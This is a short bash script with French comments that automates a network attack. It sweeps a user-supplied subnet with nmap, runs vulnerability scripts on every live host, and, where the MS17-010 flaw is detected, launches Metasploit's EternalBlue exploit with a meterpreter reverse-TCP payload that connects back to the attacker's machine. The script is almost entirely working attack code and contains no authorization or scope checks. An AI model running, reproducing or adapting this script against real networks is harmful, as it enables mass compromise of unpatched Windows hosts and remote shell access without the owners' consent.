#!/bin/bash
#!/usr/bin/env python3

######################
###\ \##/ /#| |#/ /###
####\ \/ /##| |/ /####
#####\  /###| |\ \####
#####/ /####| |#\ \###
####/_/#####|_|##\_\##
######################

#Récupérer l'IP local
IP=$(ip addr show eth0 | awk '/inet / {print$2}' | cut -d/ -f1)

#ATTENTION : Mettre une boucle if en cas d'erreur de saisie de l'utilisateur
while :;do
echo "Please enter a subnetwork (Ex: 192.168.10.0) : "
read sr

if [[ $sr =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0]+$  ]]; then
break
fi
done
echo "Veuillez saisir le bit de sous-réseau : "
read bsr
BSR="$sr/$bsr"


#Récupération des hôtes actifs du sous-réseau à l'exception de l'ip local
nmap -sn $BSR --exclude $IP | awk '/Nmap scan report for / {print $5}' > hostup.txt


#Compter le nombre de ligne du fichier hostup.txt
SEQ=$(wc -l hostup.txt | awk '{print $1}')


#Boucle afin de lister toutes les vulnérabilités sur chaque IP actives
for i in $(seq 1 $SEQ);do
#Afficher la première ligne du fichier
LINE=$(cat hostup.txt | awk "NR==$i")
#Scan nmap des vulnérabilités d'un hôte
nmap -v --script vuln $LINE > LINE$i.txt
done


#Boucle afin de rechercher la faille MS17 sur chaque IP actives
for i in $(seq 1 $SEQ);do
STRING="| smb-vuln-ms17-010:"
#Afficher la première ligne du fichier
LINE=$(cat hostup.txt | awk "NR==$i")
if [[ ! -z $(grep "$STRING" "LINE$i.txt") ]]; then
#Execution de l'exploit MS17_010
msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $IP ; set rhost $LINE ; exploit ; "

else
echo "$LINE are not vulnerable";
sleep 1

fi
done


rm hostup.txt
rm LINE*.txt
